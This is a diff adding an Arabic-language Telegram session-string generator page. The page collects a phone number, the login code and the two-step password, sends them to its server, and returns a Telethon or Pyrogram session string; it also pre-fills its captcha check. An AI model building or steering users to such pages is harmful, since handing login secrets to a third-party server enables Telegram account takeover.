@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>
+   اشعاع @RADIATION21
+  </title>
+<script async="" defer="" src="recaptcha/api.js">
+</script>
+<style>
+   @font-face {
+                font-family: "CustomFont";
+                src: url("https://upcdn.io/kW2K8GQ/raw/ar.ttf") format("truetype");
+            }
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: "CustomFont", "Arial", sans-serif;
+            }
+            body {
+                background: #ffffff url("iq.jpg") no-repeat center center fixed;
+                background-size: cover;
+                color: #fff;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                padding: 15px;
+                overflow: hidden;
+                perspective: 1000px;
+                position: relative;
+            }
+            .container {
+                width: 320px;
+                padding: 25px;
+                background: rgba(26, 26, 26, 0.8);
+                border-radius: 20px;
+                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.6), 0 5px 15px rgba(0, 0, 0, 0.4), inset 0 0 10px rgba(255, 20, 147, 0.2), -10px 0 20px rgba(255, 20, 147, 0.5), 10px 0 20px rgba(255, 20, 147, 0.5);
+                text-align: center;
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                transform: rotateY(5deg) rotateX(5deg);
+                position: relative;
+            }
+            .logo {
+                position: absolute;
+                top: -120px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 200px;
+                height: 200px;
+                border-radius: 50%;
+            }
+            .title {
+                font-size: 26px;
+                font-weight: bold;
+                margin-top: 50px;
+                margin-bottom: 20px;
+                text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.2);
+                letter-spacing: 1px;
+            }
+            .form-group {
+                margin-bottom: 20px;
+                position: relative;
+            }
+            label {
+                display: block;
+                font-size: 14px;
+                color: #fff;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+                margin-bottom: 8px;
+            }
+            input {
+                width: 100%;
+                padding: 12px 15px;
+                border: none;
+                background: rgba(30, 30, 30, 0.9);
+                color: #fff;
+                font-size: 16px;
+                border-radius: 10px 30px 10px 30px;
+                box-shadow: inset 0 0 8px rgba(255, 20, 147, 0.4), 0 0 5px rgba(255, 20, 147, 0.2);
+                background: linear-gradient(135deg, rgba(255, 20, 147, 0.1), rgba(30, 30, 30, 0.9));
+                transition: all 0.3s ease;
+                position: relative;
+                overflow: hidden;
+            }
+            input::before {
+                content: "";
+                position: absolute;
+                top: -50%;
+                left: -50%;
+                width: 200%;
+                height: 200%;
+                background: linear-gradient(45deg, rgba(255, 20, 147, 0), rgba(255, 20, 147, 0.3));
+                opacity: 0;
+                transition: opacity 0.5s ease;
+                transform: rotate(30deg);
+            }
+            input:focus::before {
+                opacity: 1;
+            }
+            input:focus {
+                background: linear-gradient(135deg, rgba(255, 20, 147, 0.2), rgba(40, 40, 40, 0.9));
+                box-shadow: 0 0 15px rgba(255, 20, 147, 0.8), inset 0 0 10px rgba(255, 20, 147, 0.5);
+                transform: translateY(-2px);
+                outline: none;
+            }
+            input::placeholder {
+                color: rgba(255, 255, 255, 0.6);
+                text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            }
+            button {
+                width: 100%;
+                padding: 12px;
+                background: #ff1493;
+                color: #fff;
+                border: none;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+                transition: all 0.3s ease;
+            }
+            button:hover {
+                background: #e0117d;
+                box-shadow: 0 0 10px rgba(255, 20, 147, 0.7);
+            }
+            .form-group button {
+                margin-top: 10px;
+            }
+            #result {
+                margin-top: 15px;
+                padding: 10px;
+                background: rgba(255, 255, 255, 0.1);
+                border-radius: 5px;
+                color: #fff;
+                font-size: 14px;
+                text-align: center;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+                max-height: 100px;
+                overflow-y: auto;
+                overflow-x: hidden;
+                word-wrap: break-word;
+            }
+            #result::-webkit-scrollbar {
+                width: 8px;
+            }
+            #result::-webkit-scrollbar-track {
+                background: rgba(26, 26, 26, 0.8);
+                border-radius: 5px;
+            }
+            #result::-webkit-scrollbar-thumb {
+                background: #ff1493;
+                border-radius: 5px;
+                box-shadow: 0 0 5px rgba(255, 20, 147, 0.5);
+            }
+            #result::-webkit-scrollbar-thumb:hover {
+                background: #e0117d;
+            }
+            #copyBtn {
+                width: 100px;
+                padding: 8px;
+                background: #28a745;
+                color: #fff;
+                border: none;
+                border-radius: 5px;
+                font-size: 14px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-top: 10px;
+            }
+            #copyBtn:hover {
+                background: #218838;
+                box-shadow: 0 0 10px rgba(40, 167, 69, 0.7);
+            }
+            #homeBtn {
+                width: 100px;
+                padding: 8px;
+                background: #2196f3;
+                color: #fff;
+                border: none;
+                border-radius: 5px;
+                font-size: 14px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-top: 10px;
+            }
+            #homeBtn:hover {
+                background: #1976d2;
+                box-shadow: 0 0 10px rgba(33, 150, 243, 0.7);
+            }
+            .telegram-buttons {
+                margin-top: 20px;
+                display: flex;
+                justify-content: center;
+                gap: 10px;
+            }
+            .telegram-btn {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 40px;
+                height: 40px;
+                background: #ff1493;
+                border-radius: 50%;
+                text-decoration: none;
+                transition: all 0.3s ease;
+                position: relative;
+                overflow: hidden;
+            }
+            .telegram-btn:hover {
+                transform: scale(1.2);
+                box-shadow: 0 0 15px rgba(255, 20, 147, 0.8), 0 0 25px rgba(255, 20, 147, 0.5);
+            }
+            .telegram-btn::after {
+                content: "";
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                width: 0;
+                height: 0;
+                background: rgba(255, 255, 255, 0.3);
+                border-radius: 50%;
+                transform: translate(-50%, -50%);
+                transition: width 0.6s ease, height 0.6s ease;
+            }
+            .telegram-btn:active::after {
+                width: 100px;
+                height: 100px;
+                opacity: 0;
+            }
+            .telegram-icon {
+                width: 24px;
+                height: 24px;
+            }
+            .audio-btn {
+                margin-right: 10px;
+            }
+            .audio-btn:hover {
+                background: #00cc00;
+                box-shadow: 0 0 15px rgba(0, 204, 0, 0.8), 0 0 25px rgba(0, 204, 0, 0.5);
+            }
+            .instagram-btn {
+                background: #e1306c;
+            }
+            .instagram-btn:hover {
+                background: #c13584;
+                box-shadow: 0 0 15px rgba(225, 48, 108, 0.8), 0 0 25px rgba(225, 48, 108, 0.5);
+            }
+            .ticker-container {
+                width: 320px;
+                height: 40px;
+                margin-top: 20px;
+                overflow: hidden;
+                position: relative;
+                background: rgba(26, 26, 26, 0.8);
+                border-radius: 15px;
+                border: 1px solid rgba(255, 20, 147, 0.8);
+                direction: rtl;
+            }
+            .ticker {
+                display: flex;
+                white-space: nowrap;
+                position: absolute;
+                top: 35%;
+                transform: translateY(-50%);
+                animation: ticker 5s linear infinite;
+            }
+            .ticker-item {
+                display: inline-block;
+                padding: 0 20px;
+                font-size: 14px;
+                color: #ffffff;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
+            }
+            @keyframes ticker {
+                0% {
+                    transform: translateX(0%);
+                }
+                100% {
+                    transform: translateX(100%);
+                }
+            }
+            .ticker:hover {
+                animation-play-state: paused;
+            }
+            .toast {
+                position: fixed;
+                top: 50%;
+                right: -300px;
+                padding: 10px 20px;
+                background: rgba(255, 20, 147, 0.9);
+                color: #fff;
+                font-size: 14px;
+                border-radius: 5px;
+                box-shadow: 0 0 15px rgba(255, 20, 147, 0.8), 0 0 25px rgba(255, 20, 147, 0.5);
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+                opacity: 0;
+                z-index: 1000;
+                animation: spinAndSlide 5s ease-in-out forwards;
+            }
+            .toast.success {
+                background: rgba(40, 167, 69, 0.9);
+                box-shadow: 0 0 15px rgba(40, 167, 69, 0.8), 0 0 25px rgba(40, 167, 69, 0.5);
+            }
+            .toast.error {
+                background: rgba(255, 0, 0, 0.9);
+                box-shadow: 0 0 15px rgba(255, 0, 0, 0.8), 0 0 25px rgba(255, 0, 0, 0.5);
+            }
+            @keyframes spinAndSlide {
+                0% {
+                    opacity: 0;
+                    right: -300px;
+                    transform: rotate(-10deg);
+                }
+                20% {
+                    opacity: 1;
+                    right: 20px;
+                    transform: rotate(0deg);
+                }
+                80% {
+                    opacity: 1;
+                    right: 20px;
+                    transform: rotate(0deg);
+                }
+                100% {
+                    opacity: 0;
+                    right: -300px;
+                    transform: rotate(10deg);
+                }
+            }
+            .toggle-container {
+                display: flex;
+                justify-content: center;
+                margin-bottom: 20px;
+            }
+            .toggle-switch {
+                position: relative;
+                width: 100px;
+                height: 30px;
+            }
+            .toggle-switch input {
+                opacity: 0;
+                width: 0;
+                height: 0;
+            }
+            .slider {
+                position: absolute;
+                cursor: pointer;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background-color: #ff1493;
+                transition: 0.4s;
+                border-radius: 30px;
+                box-shadow: 0 0 5px rgba(255, 20, 147, 0.5);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .slider:before {
+                position: absolute;
+                content: "";
+                height: 22px;
+                width: 22px;
+                left: 4px;
+                bottom: 4px;
+                background-color: white;
+                transition: 0.4s;
+                border-radius: 50%;
+            }
+            input:checked + .slider {
+                background-color: #6ebd0a;
+            }
+            input:checked + .slider:before {
+                transform: translateX(70px);
+            }
+            .slider span {
+                color: white;
+                font-size: 12px;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+                position: absolute;
+                width: 100%;
+                text-align: center;
+            }
+            .lantern {
+                position: absolute;
+                top: 10px;
+                width: 100px;
+                height: 100px;
+                z-index: 100;
+                opacity: 0.8;
+                pointer-events: auto;
+                animation: sway 3s ease-in-out infinite;
+                transition: animation-duration 0.3s ease;
+            }
+            .moving-image {
+                position: absolute;
+                width: 150px;
+                height: 150px;
+                margin-top: 675px;
+                display: block;
+                margin-left: calc(44% - 20px);
+                margin-right: auto;
+                z-index: 100;
+                opacity: 0.8;
+                pointer-events: auto;
+                animation: sway 3s ease-in-out infinite;
+                transition: animation-duration 0.3s ease;
+            }
+            @keyframes sway {
+                0% {
+                    transform: translateX(-50%);
+                }
+                50% {
+                    transform: translateX(calc(-50% + 10px));
+                }
+                100% {
+                    transform: translateX(-50%);
+                }
+            }
+            @media (max-width: 480px) {
+                .container {
+                    width: 300px;
+                    padding: 20px;
+                }
+                .title {
+                    font-size: 22px;
+                }
+                input,
+                button {
+                    font-size: 14px;
+                }
+                #copyBtn,
+                #homeBtn {
+                    width: 80px;
+                    font-size: 12px;
+                }
+                .telegram-btn {
+                    width: 36px;
+                    height: 36px;
+                }
+                .telegram-icon {
+                    width: 20px;
+                    height: 20px;
+                }
+                .toast {
+                    font-size: 12px;
+                    padding: 8px 16px;
+                }
+            }
+            .hidden {
+                display: none;
+            }
+            .g-recaptcha {
+                margin-right: -19px;
+                display: block;
+            }
+  </style>
+</head>
+<body>
+<div class="container">
+<img alt="Logo" class="logo" src="p_3359zbngi1.png"/>
+<div class="title">
+    اشعاع @RADIATION21
+   </div>
+<form id="sessionForm">
+<div class="toggle-container">
+<label class="toggle-switch">
+<input id="sessionTypeToggle" type="checkbox"/>
+<span class="slider">
+<span id="sessionName">
+        تيليثون
+       </span>
+</span>
+</label>
+</div>
+<div class="form-group">
+<label for="phone">
+      Phone Number - رقم الهاتف:
+     </label>
+<input id="phone" name="phone" placeholder="+964" required="" type="text"/>
+</div>
+<div class="form-group">
+<div class="g-recaptcha" data-callback="onRecaptchaSuccess" data-sitekey="6Ld7yvcqAAAAAGeMdFzT2h1i50MnShKOTxJFK10R">
+</div>
+</div>
+<button id="submitBtn" type="submit">
+     التالي
+    </button>
+</form>
+<div class="form-group hidden" id="codeSection">
+<label for="code">
+     رمز التحقق - OTP Code:
+    </label>
+<input id="code" name="code" placeholder="أدخل رمز التحقق" type="text"/>
+<button id="submitCode">
+     تأكيد الرمز
+    </button>
+</div>
+<div class="form-group hidden" id="passwordSection">
+<label for="password">
+     Two-step verification - التحقق بخطوتين:
+    </label>
+<input id="password" name="password" placeholder="أدخل كلمة المرور" type="password"/>
+<button id="submitPassword">
+     تأكيد كلمة المرور
+    </button>
+</div>
+<div id="result">
+</div>
+<button class="hidden" id="copyBtn">
+    نسخ
+   </button>
+<button class="hidden" id="homeBtn">
+    الصفحة الرئيسية
+   </button>
+<div class="telegram-buttons">
+<a class="telegram-btn" href="https://t.me/RADIATION21" target="_blank">
+<img alt="Telegram" class="telegram-icon" src="p_3359jfhsg1.png"/>
+</a>
+<a class="telegram-btn instagram-btn" href="https://www.instagram.com/pkw_3?igsh=a3p6aHY5d2VoNDE%3D&amp;utm_source=qr" target="_blank">
+<img alt="Instagram" class="telegram-icon" src="512/174/174855.png"/>
+</a>
+<a class="telegram-btn audio-btn" href="#" id="audioBtn">
+<img alt="Speaker" class="telegram-icon" src="p_3359roihp1.png"/>
+</a>
+</div>
+</div>
+<div class="ticker-container">
+<div class="ticker">
+<span class="ticker-item">
+     اشعاع @RADIATION21 افضل سورس في الشرق الأوسط
+    </span>
+<span class="ticker-item">
+     مطورين السورس :- اشعاع
+    </span>
+<span class="ticker-item">
+     مطور السورس :- @RADIATION21
+    </span>
+<span class="ticker-item">
+     تم برمجة اللوحة من قبل اشعاع
+    </span>
+<span class="ticker-item">
+     آللهم صل على محمد وآل محمد
+    </span>
+<span class="ticker-item">
+     اشعاع @RADIATION21 
+    </span>
+<span class="ticker-item">
+     مطورين السورس :- اشعاع
+    </span>
+<span class="ticker-item">
+     مطور السورس :- @RADIATION21
+    </span>
+<span class="ticker-item">
+     تم برمجة اللوحة من قبل اشعاع
+    </span>
+<span class="ticker-item">
+     آللهم صل على محمد وآل محمد
+    </span>
+</div>
+</div>
+<img alt="Moving Image" class="moving-image" src="p_3379i8t691.png"/>
+<script>
+   let phoneCodeHash = "";
+            const resultDiv = document.getElementById("result");
+            const copyBtn = document.getElementById("copyBtn");
+            const homeBtn = document.getElementById("homeBtn");
+            const sessionTypeToggle = document.getElementById("sessionTypeToggle");
+            const sessionName = document.getElementById("sessionName");
+            const audio = new Audio("https://a.top4top.io/m_3379bobqg1.mp3");
+            const audioBtn = document.getElementById("audioBtn");
+            const phoneInput = document.getElementById("phone");
+            let hasPlayedFromInput = false;
+            let recaptchaResponse = "6Ld7yvcqAAAAAGeMdFzT2h1i50MnShKOTxJFK10R";
+
+            function showToast(message, type = "info") {
+                const toast = document.createElement("div");
+                toast.className = `toast ${type}`;
+                toast.innerText = message;
+                document.body.appendChild(toast);
+                setTimeout(() => toast.remove(), 5000);
+            }
+
+            function getSessionType() {
+                return sessionTypeToggle.checked ? "pyrogram" : "telethon";
+            }
+
+            function updateSessionName() {
+                sessionName.textContent = getSessionType() === "telethon" ? "تيليثون" : "بايروجرام";
+            }
+
+            function toggleAudio() {
+                if (audio.paused) {
+                    audio.play();
+                    audioBtn.style.background = "#00cc00";
+                } else {
+                    audio.pause();
+                    audioBtn.style.background = "#FF1493";
+                }
+            }
+
+            window.onRecaptchaSuccess = function (response) {
+                recaptchaResponse = response;
+                showToast("تم التحقق بنجاح", "success");
+            };
+
+            sessionTypeToggle.addEventListener("change", updateSessionName);
+            updateSessionName();
+
+            audioBtn.addEventListener("click", function (e) {
+                e.preventDefault();
+                toggleAudio();
+            });
+
+            phoneInput.addEventListener("click", function () {
+                if (!hasPlayedFromInput) {
+                    audio.play();
+                    audioBtn.style.background = "#00cc00";
+                    hasPlayedFromInput = true;
+                }
+            });
+
+            audio.addEventListener("ended", function () {
+                audioBtn.style.background = "#FF1493";
+            });
+
+            document.getElementById("sessionForm").addEventListener("submit", async function (e) {
+                e.preventDefault();
+                const phone = document.getElementById("phone").value;
+                const sessionType = getSessionType();
+
+                if (!recaptchaResponse) {
+                    showToast("يرجى التحقق من أنك لست روبوت", "error");
+                    return;
+                }
+
+                showToast("جارٍ إرسال رمز التحقق...");
+                copyBtn.classList.add("hidden");
+                homeBtn.classList.add("hidden");
+
+                try {
+                    const response = await fetch("/request_code", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ phone, session_type: sessionType, recaptcha_response: recaptchaResponse }),
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        phoneCodeHash = result.phone_code_hash || "";
+                        document.getElementById("codeSection").classList.remove("hidden");
+                        document.getElementById("sessionForm").classList.add("hidden");
+                    } else {
+                        showToast(result.error, "error");
+                    }
+                } catch (error) {
+                    showToast("حدث خطأ أثناء الاتصال بالخادم", "error");
+                }
+            });
+
+            document.getElementById("submitCode").addEventListener("click", async function () {
+                const code = document.getElementById("code").value;
+                const phone = document.getElementById("phone").value;
+                const sessionType = getSessionType();
+
+                showToast("جارٍ التحقق من الرمز...");
+                copyBtn.classList.add("hidden");
+                homeBtn.classList.add("hidden");
+
+                try {
+                    const response = await fetch("/verify_code", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ phone, code, phone_code_hash: phoneCodeHash, session_type: sessionType }),
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        if (result.session === "2FA_pending") {
+                            document.getElementById("codeSection").classList.add("hidden");
+                            document.getElementById("passwordSection").classList.remove("hidden");
+                        } else {
+                            resultDiv.innerHTML = `<span id="sessionText">الجلسة: ${result.session}</span>`;
+                            copyBtn.classList.remove("hidden");
+                            homeBtn.classList.remove("hidden");
+                            document.getElementById("codeSection").classList.add("hidden");
+                        }
+                    } else if (result.error === "2FA_required") {
+                        document.getElementById("codeSection").classList.add("hidden");
+                        document.getElementById("passwordSection").classList.remove("hidden");
+                    } else {
+                        showToast(result.error, "error");
+                    }
+                } catch (error) {
+                    showToast("حدث خطأ أثناء التحقق", "error");
+                }
+            });
+
+            document.getElementById("submitPassword").addEventListener("click", async function () {
+                const password = document.getElementById("password").value;
+                const phone = document.getElementById("phone").value;
+                const sessionType = getSessionType();
+
+                showToast("جارٍ التحقق من كلمة المرور...");
+                copyBtn.classList.add("hidden");
+                homeBtn.classList.add("hidden");
+
+                try {
+                    const response = await fetch("/verify_password", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ phone, password, session_type: sessionType }),
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        resultDiv.innerHTML = `<span id="sessionText">الجلسة: ${result.session}</span>`;
+                        copyBtn.classList.remove("hidden");
+                        homeBtn.classList.remove("hidden");
+                        document.getElementById("passwordSection").classList.add("hidden");
+                    } else {
+                        if (result.error.includes("password") && result.error.includes("invalid")) {
+                            showToast("كلمة المرور غير صحيحة، يرجى التحقق منها", "error");
+                        } else {
+                            showToast(result.error, "error");
+                        }
+                    }
+                } catch (error) {
+                    showToast("حدث خطأ أثناء التحقق", "error");
+                }
+            });
+
+            copyBtn.addEventListener("click", function () {
+                const sessionText = document.getElementById("sessionText").innerText.replace("الجلسة: ", "").trim();
+
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard
+                        .writeText(sessionText)
+                        .then(() => {
+                            showToast("تم نسخ الجلسة بنجاح حبيبي", "success");
+                        })
+                        .catch((err) => {
+                            console.error("فشل في النسخ باستخدام Clipboard API: ", err);
+                            fallbackCopy(sessionText);
+                        });
+                } else {
+                    fallbackCopy(sessionText);
+                }
+            });
+
+            homeBtn.addEventListener("click", function () {
+                document.getElementById("result").innerHTML = "";
+                copyBtn.classList.add("hidden");
+                homeBtn.classList.add("hidden");
+                document.getElementById("sessionForm").classList.remove("hidden");
+                document.getElementById("codeSection").classList.add("hidden");
+                document.getElementById("passwordSection").classList.add("hidden");
+                document.getElementById("phone").value = "";
+                hasPlayedFromInput = false;
+            });
+
+            function fallbackCopy(text) {
+                const textArea = document.createElement("textarea");
+                textArea.value = text;
+                textArea.style.position = "fixed";
+                textArea.style.opacity = "0";
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+
+                try {
+                    const successful = document.execCommand("copy");
+                    if (successful) {
+                        showToast("تم نسخ الجلسة حبيبي", "success");
+                    } else {
+                        showToast("فشل في نسخ الجلسة، يرجى نسخها يدويًا", "error");
+                    }
+                } catch (err) {
+                    showToast("فشل في نسخ الجلسة: " + err, "error");
+                }
+
+                document.body.removeChild(textArea);
+            }
+            function addLanterns() {
+                const body = document.body;
+                const lanternCount = 7;
+                const pageWidth = window.innerWidth;
+                const lanternImages = ["https://k.top4top.io/p_3379bcozm1.png", "https://a.top4top.io/p_3379ir62y1.png"];
+
+                for (let i = 0; i < lanternCount; i++) {
+                    const lantern = document.createElement("img");
+                    const randomImage = lanternImages[Math.floor(Math.random() * lanternImages.length)];
+                    lantern.src = randomImage;
+                    lantern.className = "lantern";
+                    const randomX = Math.floor(Math.random() * (pageWidth - 100));
+                    lantern.style.left = `${randomX}px`;
+                    lantern.style.animationDelay = `${Math.random() * 2}s`;
+
+                    lantern.addEventListener("mouseover", function () {
+                        this.style.animationDuration = "0.5s";
+                    });
+                    lantern.addEventListener("touchstart", function (e) {
+                        e.preventDefault();
+                        this.style.animationDuration = "0.5s";
+                    });
+                    lantern.addEventListener("mouseout", function () {
+                        this.style.animationDuration = "3s";
+                    });
+                    lantern.addEventListener("touchend", function () {
+                        this.style.animationDuration = "3s";
+                    });
+
+                    body.appendChild(lantern);
+                }
+            }
+            function addMovingImage() {
+                const movingImage = document.querySelector(".moving-image");
+
+                movingImage.addEventListener("mouseover", function () {
+                    this.style.animationDuration = "0.5s";
+                });
+                movingImage.addEventListener("touchstart", function (e) {
+                    e.preventDefault();
+                    this.style.animationDuration = "0.5s";
+                });
+                movingImage.addEventListener("mouseout", function () {
+                    this.style.animationDuration = "3s";
+                });
+                movingImage.addEventListener("touchend", function () {
+                    this.style.animationDuration = "3s";
+                });
+            }
+            window.addEventListener("load", function () {
+                addLanterns();
+                addMovingImage();
+            });
+            const ticker = document.querySelector(".ticker");
+            const tickerWidth = ticker.scrollWidth;
+            const containerWidth = document.querySelector(".ticker-container").offsetWidth;
+            const duration = tickerWidth / 30;
+            ticker.style.animationDuration = `${duration}s`;
+  </script>
+</body>
+</html>
